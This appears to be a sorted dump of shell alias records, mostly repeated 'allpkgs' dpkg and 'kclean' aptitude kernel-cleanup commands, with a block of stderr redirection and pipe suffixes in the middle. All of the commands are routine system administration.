3108579,505734,allpkgs,dpkg --get-selections | grep -v deinstall"""
3108555,505733,allpkgs,dpkg --get-selections | grep -v deinstall"""
3108390,505731,allpkgs,dpkg --get-selections | grep -v deinstall"""
3108366,505730,allpkgs,dpkg --get-selections | grep -v deinstall"""
3108201,505728,allpkgs,dpkg --get-selections | grep -v deinstall"""
3108177,505727,allpkgs,dpkg --get-selections | grep -v deinstall"""
3107871,505724,allpkgs,dpkg --get-selections | grep -v deinstall"""
3107424,505720,allpkgs,dpkg --get-selections | grep -v deinstall"""
3107400,505719,allpkgs,dpkg --get-selections | grep -v deinstall"""
3107376,505718,allpkgs,dpkg --get-selections | grep -v deinstall"""
3107194,505714,allpkgs,dpkg --get-selections | grep -v deinstall"""
3107170,505713,allpkgs,dpkg --get-selections | grep -v deinstall"""
3106298,505701,allpkgs,dpkg --get-selections | grep -v deinstall"""
3105934,505694,allpkgs,dpkg --get-selections | grep -v deinstall"""
3105910,505693,allpkgs,dpkg --get-selections | grep -v deinstall"""
3105463,505686,allpkgs,dpkg --get-selections | grep -v deinstall"""
3104565,505671,allpkgs,dpkg --get-selections | grep -v deinstall"""
3104539,505669,allpkgs,dpkg --get-selections | grep -v deinstall"""
3104515,505666,allpkgs,dpkg --get-selections | grep -v deinstall"""
3104193,505657,allpkgs,dpkg --get-selections | grep -v deinstall"""
3104142,505655,allpkgs,dpkg --get-selections | grep -v deinstall"""
3103977,505653,allpkgs,dpkg --get-selections | grep -v deinstall"""
3103940,505641,allpkgs,dpkg --get-selections | grep -v deinstall"""
3103754,505626,allpkgs,dpkg --get-selections | grep -v deinstall"""
3103589,505622,allpkgs,dpkg --get-selections | grep -v deinstall"""
3103496,505611,allpkgs,dpkg --get-selections | grep -v deinstall"""
3102606,505588,allpkgs,dpkg --get-selections | grep -v deinstall"""
3102153,505579,allpkgs,dpkg --get-selections | grep -v deinstall"""
3102112,505574,allpkgs,dpkg --get-selections | grep -v deinstall"""
3101805,505564,allpkgs,dpkg --get-selections | grep -v deinstall"""
3101643,505560,allpkgs,dpkg --get-selections | grep -v deinstall"""
3101442,505552,allpkgs,dpkg --get-selections | grep -v deinstall"""
3101091,505544,allpkgs,dpkg --get-selections | grep -v deinstall"""
3100503,505521,allpkgs,dpkg --get-selections | grep -v deinstall"""
3100448,505517,allpkgs,dpkg --get-selections | grep -v deinstall"""
3100405,505515,allpkgs,dpkg --get-selections | grep -v deinstall"""
3100052,505503,allpkgs,dpkg --get-selections | grep -v deinstall"""
3100018,505497,allpkgs,dpkg --get-selections | grep -v deinstall"""
3099778,505480,allpkgs,dpkg --get-selections | grep -v deinstall"""
3064423,501280,tree,ls -R | grep """
306306,103247,clip,| xclip -selection c"""
3038416,498657,gbs,git branch | perl -ne """
3034315,497958,l.,ls -A | egrep '^\.'"""
3029730,497461,hi,history | tail -20"""
3029225,497416,allpkgs,dpkg --get-selections | grep -v deinstall"""
3028919,497363,allpkgs,dpkg --get-selections | grep -v deinstall"""
3028591,497343,psx,grc ps -aux | grep"""
3028340,497291,kclean,sudo aptitude remove -P ?and(~i~nlinux-(ima|hea) \"
3028170,497275,kclean,sudo aptitude remove -P ?and(~i~nlinux-(ima|hea) \"
3028080,497259,lsd,ls -lF ${colorflag} | grep --color=never '^d'"""
3028024,497253,kclean,sudo aptitude remove -P ?and(~i~nlinux-(ima|hea) \"
3027945,497230,allpkgs,dpkg --get-selections | grep -v deinstall"""
3027777,497187,kclean,sudo aptitude remove -P ?and(~i~nlinux-(ima|hea) \"
3027731,497183,kclean,sudo aptitude remove -P ?and(~i~nlinux-(ima|hea) \"
3027650,497178,allpkgs,dpkg --get-selections | grep -v deinstall"""
3027627,497177,allpkgs,dpkg --get-selections | grep -v deinstall"""
3027555,497175,kclean,sudo aptitude remove -P ?and(~i~nlinux-(ima|hea) \"
3027447,497158,kclean,sudo aptitude remove -P ?and(~i~nlinux-(ima|hea) \"
3027383,497151,kclean,sudo aptitude remove -P ?and(~i~nlinux-(ima|hea) \"
3027279,497148,allpkgs,dpkg --get-selections | grep -v deinstall"""
3027255,497147,kclean,sudo aptitude remove -P ?and(~i~nlinux-(ima|hea) \"
3027153,497140,kclean,sudo aptitude remove -P ?and(~i~nlinux-(ima|hea) \"
3027107,497131,allpkgs,dpkg --get-selections | grep -v deinstall"""
3027084,497127,allpkgs,dpkg --get-selections | grep -v deinstall"""
3027059,497125,kclean,sudo aptitude remove -P ?and(~i~nlinux-(ima|hea) \"
3027014,497123,allpkgs,dpkg --get-selections | grep -v deinstall"""
3026990,497122,kclean,sudo aptitude remove -P ?and(~i~nlinux-(ima|hea) \"
3026945,497120,allpkgs,dpkg --get-selections | grep -v deinstall"""
3026921,497119,kclean,sudo aptitude remove -P ?and(~i~nlinux-(ima|hea) \"
3026875,497116,allpkgs,dpkg --get-selections | grep -v deinstall"""
3026852,497115,allpkgs,dpkg --get-selections | grep -v deinstall"""
3026829,497114,allpkgs,dpkg --get-selections | grep -v deinstall"""
3026805,497113,kclean,sudo aptitude remove -P ?and(~i~nlinux-(ima|hea) \"
3026760,497111,allpkgs,dpkg --get-selections | grep -v deinstall"""
3026736,497109,kclean,sudo aptitude remove -P ?and(~i~nlinux-(ima|hea) \"
3026690,497107,kclean,sudo aptitude remove -P ?and(~i~nlinux-(ima|hea) \"
3026644,497105,kclean,sudo aptitude remove -P ?and(~i~nlinux-(ima|hea) \"
3026565,497101,kclean,sudo aptitude remove -P ?and(~i~nlinux-(ima|hea) \"
3026519,497099,kclean,sudo aptitude remove -P ?and(~i~nlinux-(ima|hea) \"
3026473,497097,kclean,sudo aptitude remove -P ?and(~i~nlinux-(ima|hea) \"
3026428,497094,allpkgs,dpkg --get-selections | grep -v deinstall"""
3026404,497093,kclean,sudo aptitude remove -P ?and(~i~nlinux-(ima|hea) \"
3026358,497088,kclean,sudo aptitude remove -P ?and(~i~nlinux-(ima|hea) \"
3026313,497085,allpkgs,dpkg --get-selections | grep -v deinstall"""
3026289,497084,kclean,sudo aptitude remove -P ?and(~i~nlinux-(ima|hea) \"
3026243,497082,kclean,sudo aptitude remove -P ?and(~i~nlinux-(ima|hea) \"
3026196,497079,kclean,sudo aptitude remove -P ?and(~i~nlinux-(ima|hea) \"
3026149,497076,kclean,sudo aptitude remove -P ?and(~i~nlinux-(ima|hea) \"
3026103,497074,kclean,sudo aptitude remove -P ?and(~i~nlinux-(ima|hea) \"
3026057,497071,kclean,sudo aptitude remove -P ?and(~i~nlinux-(ima|hea) \"
3026011,497067,kclean,sudo aptitude remove -P ?and(~i~nlinux-(ima|hea) \"
3025965,497065,kclean,sudo aptitude remove -P ?and(~i~nlinux-(ima|hea) \"
3025916,497060,kclean,sudo aptitude remove -P ?and(~i~nlinux-(ima|hea) \"
3025870,497058,kclean,sudo aptitude remove -P ?and(~i~nlinux-(ima|hea) \"
3025824,497056,kclean,sudo aptitude remove -P ?and(~i~nlinux-(ima|hea) \"
3025778,497054,kclean,sudo aptitude remove -P ?and(~i~nlinux-(ima|hea) \"
3025732,497052,kclean,sudo aptitude remove -P ?and(~i~nlinux-(ima|hea) \"
3025686,497050,kclean,sudo aptitude remove -P ?and(~i~nlinux-(ima|hea) \"
3025640,497048,kclean,sudo aptitude remove -P ?and(~i~nlinux-(ima|hea) \"
3025594,497046,kclean,sudo aptitude remove -P ?and(~i~nlinux-(ima|hea) \"
3025548,497043,kclean,sudo aptitude remove -P ?and(~i~nlinux-(ima|hea) \"
3025502,497041,kclean,sudo aptitude remove -P ?and(~i~nlinux-(ima|hea) \"
3025456,497039,kclean,sudo aptitude remove -P ?and(~i~nlinux-(ima|hea) \"
3025410,497037,kclean,sudo aptitude remove -P ?and(~i~nlinux-(ima|hea) \"
3025364,497035,kclean,sudo aptitude remove -P ?and(~i~nlinux-(ima|hea) \"
3025319,497033,allpkgs,dpkg --get-selections | grep -v deinstall"""
3025291,497031,kclean,sudo aptitude remove -P ?and(~i~nlinux-(ima|hea) \"
3025180,497026,kclean,sudo aptitude remove -P ?and(~i~nlinux-(ima|hea) \"
3025134,497024,kclean,sudo aptitude remove -P ?and(~i~nlinux-(ima|hea) \"
3025088,497022,kclean,sudo aptitude remove -P ?and(~i~nlinux-(ima|hea) \"
3025042,497018,kclean,sudo aptitude remove -P ?and(~i~nlinux-(ima|hea) \"
3024996,497016,kclean,sudo aptitude remove -P ?and(~i~nlinux-(ima|hea) \"
3024950,497014,kclean,sudo aptitude remove -P ?and(~i~nlinux-(ima|hea) \"
3024904,497011,kclean,sudo aptitude remove -P ?and(~i~nlinux-(ima|hea) \"
3024858,497009,kclean,sudo aptitude remove -P ?and(~i~nlinux-(ima|hea) \"
3024812,497005,kclean,sudo aptitude remove -P ?and(~i~nlinux-(ima|hea) \"
3024766,497001,kclean,sudo aptitude remove -P ?and(~i~nlinux-(ima|hea) \"
3024720,496998,kclean,sudo aptitude remove -P ?and(~i~nlinux-(ima|hea) \"
3024674,496996,kclean,sudo aptitude remove -P ?and(~i~nlinux-(ima|hea) \"
3024628,496992,allpkgs,dpkg --get-selections | grep -v deinstall"""
3024604,496990,kclean,sudo aptitude remove -P ?and(~i~nlinux-(ima|hea) \"
3024558,496987,kclean,sudo aptitude remove -P ?and(~i~nlinux-(ima|hea) \"
3024512,496984,kclean,sudo aptitude remove -P ?and(~i~nlinux-(ima|hea) \"
3024465,496980,kclean,sudo aptitude remove -P ?and(~i~nlinux-(ima|hea) \"
3024418,496977,kclean,sudo aptitude remove -P ?and(~i~nlinux-(ima|hea) \"
3024345,496974,lm,ll |more"""
3024303,496972,kclean,sudo aptitude remove -P ?and(~i~nlinux-(ima|hea) \"
3024250,496969,kclean,sudo aptitude remove -P ?and(~i~nlinux-(ima|hea) \"
3024204,496967,kclean,sudo aptitude remove -P ?and(~i~nlinux-(ima|hea) \"
3024157,496964,kclean,sudo aptitude remove -P ?and(~i~nlinux-(ima|hea) \"
3024111,496962,kclean,sudo aptitude remove -P ?and(~i~nlinux-(ima|hea) \"
3024065,496960,kclean,sudo aptitude remove -P ?and(~i~nlinux-(ima|hea) \"
3024001,496950,kclean,sudo aptitude remove -P ?and(~i~nlinux-(ima|hea) \"
3023899,496944,kclean,sudo aptitude remove -P ?and(~i~nlinux-(ima|hea) \"
3023810,496933,kclean,sudo aptitude remove -P ?and(~i~nlinux-(ima|hea) \"
3023754,496925,kclean,sudo aptitude remove -P ?and(~i~nlinux-(ima|hea) \"
3023708,496923,kclean,sudo aptitude remove -P ?and(~i~nlinux-(ima|hea) \"
3023658,496909,kclean,sudo aptitude remove -P ?and(~i~nlinux-(ima|hea) \"
3023600,496898,firewall,clear; sudo /usr/sbin/tcpdump -vlnettti pflog0|grep -A1 """"block out"""""""
3023572,496892,kclean,sudo aptitude remove -P ?and(~i~nlinux-(ima|hea) \"
3023526,496887,kclean,sudo aptitude remove -P ?and(~i~nlinux-(ima|hea) \"
3023445,496881,kclean,sudo aptitude remove -P ?and(~i~nlinux-(ima|hea) \"
3023399,496879,kclean,sudo aptitude remove -P ?and(~i~nlinux-(ima|hea) \"
3023273,496870,kclean,sudo aptitude remove -P ?and(~i~nlinux-(ima|hea) \"
3023144,496864,allpkgs,dpkg --get-selections | grep -v deinstall"""
3023119,496862,allpkgs,dpkg --get-selections | grep -v deinstall"""
3022972,496854,kclean,sudo aptitude remove -P ?and(~i~nlinux-(ima|hea) \"
3022915,496851,lsbig,ls -lSh *(.) | head"""
3022885,496846,allpkgs,dpkg --get-selections | grep -v deinstall"""
3022861,496844,kclean,sudo aptitude remove -P ?and(~i~nlinux-(ima|hea) \"
3022814,496841,kclean,sudo aptitude remove -P ?and(~i~nlinux-(ima|hea) \"
3022706,496827,kclean,sudo aptitude remove -P ?and(~i~nlinux-(ima|hea) \"
3019604,496298,nomz,ps aux | less"""
3016329,495931,allpkgs,dpkg --get-selections | grep -v deinstall"""
3014841,495730,allpkgs,dpkg --get-selections | grep -v deinstall"""
3014518,495573,allpkgs,dpkg --get-selections | grep -v deinstall"""
3009267,495414,allpkgs,dpkg --get-selections | grep -v deinstall"""
3002104,494659,allpkgs,dpkg --get-selections | grep -v deinstall"""
3001921,494646,allpkgs,dpkg --get-selections | grep -v deinstall"""
3001762,494632,allpkgs,dpkg --get-selections | grep -v deinstall"""
3001710,494627,allpkgs,dpkg --get-selections | grep -v deinstall"""
3001310,494588,allpkgs,dpkg --get-selections | grep -v deinstall"""
3001287,494585,allpkgs,dpkg --get-selections | grep -v deinstall"""
3001251,494583,allpkgs,dpkg --get-selections | grep -v deinstall"""
3001229,494581,allpkgs,dpkg --get-selections | grep -v deinstall"""
3001205,494579,allpkgs,dpkg --get-selections | grep -v deinstall"""
3001155,494573,allpkgs,dpkg --get-selections | grep -v deinstall"""
3001133,494572,allpkgs,dpkg --get-selections | grep -v deinstall"""
3001103,494569,allpkgs,dpkg --get-selections | grep -v deinstall"""
3001018,494563,allpkgs,dpkg --get-selections | grep -v deinstall"""
3000996,494562,allpkgs,dpkg --get-selections | grep -v deinstall"""
3000922,494548,allpkgs,dpkg --get-selections | grep -v deinstall"""
3000898,494546,allpkgs,dpkg --get-selections | grep -v deinstall"""
3000867,494542,allpkgs,dpkg --get-selections | grep -v deinstall"""
3000816,494537,allpkgs,dpkg --get-selections | grep -v deinstall"""
3000784,494534,allpkgs,dpkg --get-selections | grep -v deinstall"""
3000752,494529,allpkgs,dpkg --get-selections | grep -v deinstall"""
3000704,494526,allpkgs,dpkg --get-selections | grep -v deinstall"""
3000652,494522,allpkgs,dpkg --get-selections | grep -v deinstall"""
3000508,494503,allpkgs,dpkg --get-selections | grep -v deinstall"""
3000486,494502,allpkgs,dpkg --get-selections | grep -v deinstall"""
3000345,494491,allpkgs,dpkg --get-selections | grep -v deinstall"""
3000299,494488,allpkgs,dpkg --get-selections | grep -v deinstall"""
3000237,494483,allpkgs,dpkg --get-selections | grep -v deinstall"""
3000215,494482,allpkgs,dpkg --get-selections | grep -v deinstall"""
3000193,494481,allpkgs,dpkg --get-selections | grep -v deinstall"""
3000171,494480,allpkgs,dpkg --get-selections | grep -v deinstall"""
3000149,494478,allpkgs,dpkg --get-selections | grep -v deinstall"""
3000127,494477,allpkgs,dpkg --get-selections | grep -v deinstall"""
3000105,494476,allpkgs,dpkg --get-selections | grep -v deinstall"""
3000018,494471,allpkgs,dpkg --get-selections | grep -v deinstall"""
2fa -clip neoway | xcopy; sudo openvpn /etc/openvpn/neoway.conf
2>|/dev/null
2>log.err|tee log.out
2>>log.err|tee -a log.out
2>/dev/null|V
2>/dev/null|T
2>/dev/null|L
2>/dev/null|H
2>/dev/null|GI
2>/dev/null|G
2>/dev/null|C
2>/dev/null | jq
2>/dev/null | grep -i
2>&1|xsel -bi
2>&1|vim -R -
2>&1|view -
2>&1|tee
2>&1|tail
2>&1|less -r
2>&1|less -FX
2>&1|less -F
2>&1|less --raw-control-chars --quit-if-one-screen --ignore-case --status-column --no-init
2>&1|less
2>&1|head
2>&1|grep -i
2>&1|grep --line-buffered --color=auto -iaE
2>&1|grep --line-buffered --color=auto -aE
2>&1|cat
2>&1|/usr/bin/less
2>&1|/dev/null
2>&1|$PAGER
2>&1| pygmentize -l pytb
2>&1| pygmentize -g
2>&1| pygemtize -l pytb
2>&1| ag
2>&1|
2>&1 |tee ~/${LOG_FILE_NAME}
2>&1 |tee /tmp/log
2>&1 |tee -a ${LOG_FILE_NAME}
2>&1 |tee ${LOG_FILE_NAME}
2>&1 |rg
2>&1 |less -R
2>&1 |less
2>&1 |grep
2>&1 | ~/usr/local/bin/timestamp.sh
2>&1 | xsel -bi
2>&1 | xargs tmux display-message &
2>&1 | xargs -I{} tmux set-buffer {}
2>&1 | xargs -I{}
2>&1 | wc --words
2>&1 | wc --lines
2>&1 | wc --chars
2>&1 | wc --bytes
2>&1 | vless
2>&1 | vim -c 'au! CursorHold' -
2>&1 | vim -c
2>&1 | vim -R -
2>&1 | vim - -R
2>&1 | vim -
2>&1 | v -
2>&1 | up
2>&1 | tmux load-buffer -
2>&1 | tee gean
2>&1 | tee err
2>&1 | tee /tmp/quickfix.err
2>&1 | tee -i
2>&1 | tee -a log.txt
2>&1 | tee -a
2>&1 | tee
2>&1 | tail -f
2>&1 | tail
2>&1 | sit
2>&1 | sed '\:from /Users/metalelf0/.rbenv:d'
2>&1 | sed
2>&1 | pygmentize -l pytb
2>&1 | notify-send &
2>&1 | nkf -uw
2>&1 | most
2>&1 | more
2>&1 | less -r
2>&1 | less -c
2>&1 | less -XSFR
2>&1 | less -SRi
2>&1 | less -S
2>&1 | less -R
2>&1 | less -F -R
2>&1 | less
2>&1 | iconv -c -f Shift_JIS -t UTF-8
2>&1 | head -q
2>&1 | head
2>&1 | grep -v
2>&1 | grep -i
2>&1 | grep --color=always
2>&1 | grep --color
2>&1 | grep
2>&1 | fzf --reverse
2>&1 | egrep -iv
2>&1 | egrep -i
2>&1 | cut
2>&1 | color
2>&1 | ccze --mode ansi
2>&1 | cat -et
2>&1 | cat -A
2>&1 | cat
2>&1 | btee
2>&1 | bat --paging always --style full
2>&1 | bat --color=always
2>&1 | bat
2>&1 | awk
2>&1 | \grep Playing
2>&1 | TERM=vt100 less
2>&1 | $PAGER
2>&1 |
2>&1 >/dev/null|V
2>&1 >/dev/null|T
2>&1 >/dev/null|L
2>&1 >/dev/null|H
2>&1 >/dev/null|GI
2>&1 >/dev/null|G
2>&1 >/dev/null|C
2>&1 > /dev/null | xc
2>&1 1>/dev/null | less -c
2>&1 1>/dev/null | bat
2>&1 --help | less
2>&- >&- &|
2999996,494470,allpkgs,dpkg --get-selections | grep -v deinstall"""
2999974,494467,allpkgs,dpkg --get-selections | grep -v deinstall"""
2999952,494466,allpkgs,dpkg --get-selections | grep -v deinstall"""
2999930,494465,allpkgs,dpkg --get-selections | grep -v deinstall"""
2999908,494464,allpkgs,dpkg --get-selections | grep -v deinstall"""
2999828,494462,allpkgs,dpkg --get-selections | grep -v deinstall"""
2999806,494460,allpkgs,dpkg --get-selections | grep -v deinstall"""
2999784,494459,allpkgs,dpkg --get-selections | grep -v deinstall"""
2999762,494458,allpkgs,dpkg --get-selections | grep -v deinstall"""
2999740,494457,allpkgs,dpkg --get-selections | grep -v deinstall"""
2999634,494450,allpkgs,dpkg --get-selections | grep -v deinstall"""
2999585,494447,allpkgs,dpkg --get-selections | grep -v deinstall"""
2999563,494446,allpkgs,dpkg --get-selections | grep -v deinstall"""
2999528,494442,allpkgs,dpkg --get-selections | grep -v deinstall"""
2999506,494441,allpkgs,dpkg --get-selections | grep -v deinstall"""
2999484,494440,allpkgs,dpkg --get-selections | grep -v deinstall"""
2999398,494437,allpkgs,dpkg --get-selections | grep -v deinstall"""
2999359,494434,allpkgs,dpkg --get-selections | grep -v deinstall"""
2999337,494433,allpkgs,dpkg --get-selections | grep -v deinstall"""
2999315,494432,allpkgs,dpkg --get-selections | grep -v deinstall"""
2999267,494429,allpkgs,dpkg --get-selections | grep -v deinstall"""
2999245,494428,allpkgs,dpkg --get-selections | grep -v deinstall"""
2999223,494427,allpkgs,dpkg --get-selections | grep -v deinstall"""
2999201,494425,allpkgs,dpkg --get-selections | grep -v deinstall"""
2999169,494422,allpkgs,dpkg --get-selections | grep -v deinstall"""
2999147,494421,allpkgs,dpkg --get-selections | grep -v deinstall"""
2999045,494418,allpkgs,dpkg --get-selections | grep -v deinstall"""
2999023,494417,allpkgs,dpkg --get-selections | grep -v deinstall"""
2999001,494416,allpkgs,dpkg --get-selections | grep -v deinstall"""
2998979,494415,allpkgs,dpkg --get-selections | grep -v deinstall"""
2998957,494414,allpkgs,dpkg --get-selections | grep -v deinstall"""
2998935,494413,allpkgs,dpkg --get-selections | grep -v deinstall"""
2998902,494411,allpkgs,dpkg --get-selections | grep -v deinstall"""
2998880,494410,allpkgs,dpkg --get-selections | grep -v deinstall"""
2998848,494408,allpkgs,dpkg --get-selections | grep -v deinstall"""
2998826,494407,allpkgs,dpkg --get-selections | grep -v deinstall"""
2998804,494406,allpkgs,dpkg --get-selections | grep -v deinstall"""
2998782,494405,allpkgs,dpkg --get-selections | grep -v deinstall"""
2998760,494404,allpkgs,dpkg --get-selections | grep -v deinstall"""
2998738,494403,allpkgs,dpkg --get-selections | grep -v deinstall"""
2998716,494402,allpkgs,dpkg --get-selections | grep -v deinstall"""
2998694,494401,allpkgs,dpkg --get-selections | grep -v deinstall"""
2998672,494400,allpkgs,dpkg --get-selections | grep -v deinstall"""
2998646,494398,allpkgs,dpkg --get-selections | grep -v deinstall"""
2998607,494394,allpkgs,dpkg --get-selections | grep -v deinstall"""
2998583,494392,allpkgs,dpkg --get-selections | grep -v deinstall"""
2998561,494391,allpkgs,dpkg --get-selections | grep -v deinstall"""
2998539,494390,allpkgs,dpkg --get-selections | grep -v deinstall"""
2998517,494389,allpkgs,dpkg --get-selections | grep -v deinstall"""
2998495,494387,allpkgs,dpkg --get-selections | grep -v deinstall"""
2998473,494386,allpkgs,dpkg --get-selections | grep -v deinstall"""
2998451,494385,allpkgs,dpkg --get-selections | grep -v deinstall"""
2998429,494384,allpkgs,dpkg --get-selections | grep -v deinstall"""
2998407,494383,allpkgs,dpkg --get-selections | grep -v deinstall"""
2998385,494382,allpkgs,dpkg --get-selections | grep -v deinstall"""
2998363,494381,allpkgs,dpkg --get-selections | grep -v deinstall"""
2998341,494380,allpkgs,dpkg --get-selections | grep -v deinstall"""
2998319,494379,allpkgs,dpkg --get-selections | grep -v deinstall"""
2998297,494378,allpkgs,dpkg --get-selections | grep -v deinstall"""
2998275,494377,allpkgs,dpkg --get-selections | grep -v deinstall"""
2998253,494376,allpkgs,dpkg --get-selections | grep -v deinstall"""
2998231,494375,allpkgs,dpkg --get-selections | grep -v deinstall"""
2998209,494373,allpkgs,dpkg --get-selections | grep -v deinstall"""
2998187,494372,allpkgs,dpkg --get-selections | grep -v deinstall"""
2998165,494371,allpkgs,dpkg --get-selections | grep -v deinstall"""
2998138,494369,allpkgs,dpkg --get-selections | grep -v deinstall"""
2998116,494368,allpkgs,dpkg --get-selections | grep -v deinstall"""
2998094,494367,allpkgs,dpkg --get-selections | grep -v deinstall"""
2998072,494366,allpkgs,dpkg --get-selections | grep -v deinstall"""
2998050,494365,allpkgs,dpkg --get-selections | grep -v deinstall"""
2998028,494364,allpkgs,dpkg --get-selections | grep -v deinstall"""
2998006,494363,allpkgs,dpkg --get-selections | grep -v deinstall"""
2997984,494362,allpkgs,dpkg --get-selections | grep -v deinstall"""
2997962,494361,allpkgs,dpkg --get-selections | grep -v deinstall"""
2997940,494360,allpkgs,dpkg --get-selections | grep -v deinstall"""
2997918,494359,allpkgs,dpkg --get-selections | grep -v deinstall"""
2997896,494358,allpkgs,dpkg --get-selections | grep -v deinstall"""
2997874,494357,allpkgs,dpkg --get-selections | grep -v deinstall"""
2997852,494356,allpkgs,dpkg --get-selections | grep -v deinstall"""
2997830,494355,allpkgs,dpkg --get-selections | grep -v deinstall"""
2997808,494354,allpkgs,dpkg --get-selections | grep -v deinstall"""
2997786,494352,allpkgs,dpkg --get-selections | grep -v deinstall"""
2997764,494351,allpkgs,dpkg --get-selections | grep -v deinstall"""
2997742,494350,allpkgs,dpkg --get-selections | grep -v deinstall"""
2997720,494349,allpkgs,dpkg --get-selections | grep -v deinstall"""
2997698,494348,allpkgs,dpkg --get-selections | grep -v deinstall"""
2997676,494347,allpkgs,dpkg --get-selections | grep -v deinstall"""
2997654,494346,allpkgs,dpkg --get-selections | grep -v deinstall"""
2997632,494345,allpkgs,dpkg --get-selections | grep -v deinstall"""
2997610,494344,allpkgs,dpkg --get-selections | grep -v deinstall"""
2997588,494343,allpkgs,dpkg --get-selections | grep -v deinstall"""
2997555,494341,allpkgs,dpkg --get-selections | grep -v deinstall"""
2997533,494340,allpkgs,dpkg --get-selections | grep -v deinstall"""
2997487,494338,allpkgs,dpkg --get-selections | grep -v deinstall"""
2997465,494337,allpkgs,dpkg --get-selections | grep -v deinstall"""
2997443,494335,allpkgs,dpkg --get-selections | grep -v deinstall"""
2997421,494334,allpkgs,dpkg --get-selections | grep -v deinstall"""
2997399,494333,allpkgs,dpkg --get-selections | grep -v deinstall"""
2997377,494332,allpkgs,dpkg --get-selections | grep -v deinstall"""
2997355,494331,allpkgs,dpkg --get-selections | grep -v deinstall"""
2997333,494330,allpkgs,dpkg --get-selections | grep -v deinstall"""
2997311,494329,allpkgs,dpkg --get-selections | grep -v deinstall"""
2997289,494328,allpkgs,dpkg --get-selections | grep -v deinstall"""
2997267,494327,allpkgs,dpkg --get-selections | grep -v deinstall"""
2997245,494326,allpkgs,dpkg --get-selections | grep -v deinstall"""
2997223,494325,allpkgs,dpkg --get-selections | grep -v deinstall"""
2997201,494324,allpkgs,dpkg --get-selections | grep -v deinstall"""
2997179,494323,allpkgs,dpkg --get-selections | grep -v deinstall"""
2997119,494321,allpkgs,dpkg --get-selections | grep -v deinstall"""
2997097,494320,allpkgs,dpkg --get-selections | grep -v deinstall"""
2997075,494319,allpkgs,dpkg --get-selections | grep -v deinstall"""
2997053,494318,allpkgs,dpkg --get-selections | grep -v deinstall"""
2997031,494317,allpkgs,dpkg --get-selections | grep -v deinstall"""
2997009,494316,allpkgs,dpkg --get-selections | grep -v deinstall"""
2996987,494315,allpkgs,dpkg --get-selections | grep -v deinstall"""
2996965,494314,allpkgs,dpkg --get-selections | grep -v deinstall"""
2996943,494313,allpkgs,dpkg --get-selections | grep -v deinstall"""
2996921,494312,allpkgs,dpkg --get-selections | grep -v deinstall"""
2996899,494311,allpkgs,dpkg --get-selections | grep -v deinstall"""
2996877,494310,allpkgs,dpkg --get-selections | grep -v deinstall"""
2996855,494309,allpkgs,dpkg --get-selections | grep -v deinstall"""
2996833,494308,allpkgs,dpkg --get-selections | grep -v deinstall"""
2996811,494307,allpkgs,dpkg --get-selections | grep -v deinstall"""
2996789,494306,allpkgs,dpkg --get-selections | grep -v deinstall"""
2996767,494305,allpkgs,dpkg --get-selections | grep -v deinstall"""
2996745,494304,allpkgs,dpkg --get-selections | grep -v deinstall"""
2996723,494303,allpkgs,dpkg --get-selections | grep -v deinstall"""
2996701,494302,allpkgs,dpkg --get-selections | grep -v deinstall"""
2996679,494301,allpkgs,dpkg --get-selections | grep -v deinstall"""
2996657,494300,allpkgs,dpkg --get-selections | grep -v deinstall"""
2996635,494299,allpkgs,dpkg --get-selections | grep -v deinstall"""
2996608,494297,allpkgs,dpkg --get-selections | grep -v deinstall"""
2996586,494296,allpkgs,dpkg --get-selections | grep -v deinstall"""
2996564,494294,allpkgs,dpkg --get-selections | grep -v deinstall"""
2996532,494292,allpkgs,dpkg --get-selections | grep -v deinstall"""
2996461,494290,allpkgs,dpkg --get-selections | grep -v deinstall"""
2996439,494289,allpkgs,dpkg --get-selections | grep -v deinstall"""
2996417,494288,allpkgs,dpkg --get-selections | grep -v deinstall"""
2996395,494287,allpkgs,dpkg --get-selections | grep -v deinstall"""
2996373,494286,allpkgs,dpkg --get-selections | grep -v deinstall"""
2996351,494285,allpkgs,dpkg --get-selections | grep -v deinstall"""
2996329,494284,allpkgs,dpkg --get-selections | grep -v deinstall"""
2996307,494283,allpkgs,dpkg --get-selections | grep -v deinstall"""
2996285,494282,allpkgs,dpkg --get-selections | grep -v deinstall"""
2996263,494281,allpkgs,dpkg --get-selections | grep -v deinstall"""
2996241,494280,allpkgs,dpkg --get-selections | grep -v deinstall"""
2996219,494279,allpkgs,dpkg --get-selections | grep -v deinstall"""
2996197,494278,allpkgs,dpkg --get-selections | grep -v deinstall"""
2996175,494277,allpkgs,dpkg --get-selections | grep -v deinstall"""
2996153,494276,allpkgs,dpkg --get-selections | grep -v deinstall"""
2996131,494275,allpkgs,dpkg --get-selections | grep -v deinstall"""
2996109,494274,allpkgs,dpkg --get-selections | grep -v deinstall"""
2996087,494273,allpkgs,dpkg --get-selections | grep -v deinstall"""
2996065,494272,allpkgs,dpkg --get-selections | grep -v deinstall"""
2996043,494271,allpkgs,dpkg --get-selections | grep -v deinstall"""
2996021,494270,allpkgs,dpkg --get-selections | grep -v deinstall"""
2995999,494269,allpkgs,dpkg --get-selections | grep -v deinstall"""
2995977,494268,allpkgs,dpkg --get-selections | grep -v deinstall"""
2995955,494267,allpkgs,dpkg --get-selections | grep -v deinstall"""
2995933,494266,allpkgs,dpkg --get-selections | grep -v deinstall"""
2995901,494264,allpkgs,dpkg --get-selections | grep -v deinstall"""
2995863,494262,allpkgs,dpkg --get-selections | grep -v deinstall"""
2995841,494261,allpkgs,dpkg --get-selections | grep -v deinstall"""
2995811,494259,allpkgs,dpkg --get-selections | grep -v deinstall"""
2995789,494258,allpkgs,dpkg --get-selections | grep -v deinstall"""
2995767,494257,allpkgs,dpkg --get-selections | grep -v deinstall"""
2995745,494256,allpkgs,dpkg --get-selections | grep -v deinstall"""
2995723,494255,allpkgs,dpkg --get-selections | grep -v deinstall"""
2995701,494254,allpkgs,dpkg --get-selections | grep -v deinstall"""
2995679,494253,allpkgs,dpkg --get-selections | grep -v deinstall"""
2995657,494252,allpkgs,dpkg --get-selections | grep -v deinstall"""
2995635,494251,allpkgs,dpkg --get-selections | grep -v deinstall"""
2995613,494250,allpkgs,dpkg --get-selections | grep -v deinstall"""
2995591,494249,allpkgs,dpkg --get-selections | grep -v deinstall"""
2995569,494248,allpkgs,dpkg --get-selections | grep -v deinstall"""
2995547,494247,allpkgs,dpkg --get-selections | grep -v deinstall"""
2995525,494246,allpkgs,dpkg --get-selections | grep -v deinstall"""
2995503,494245,allpkgs,dpkg --get-selections | grep -v deinstall"""
2995481,494244,allpkgs,dpkg --get-selections | grep -v deinstall"""
2995459,494243,allpkgs,dpkg --get-selections | grep -v deinstall"""
2995437,494242,allpkgs,dpkg --get-selections | grep -v deinstall"""
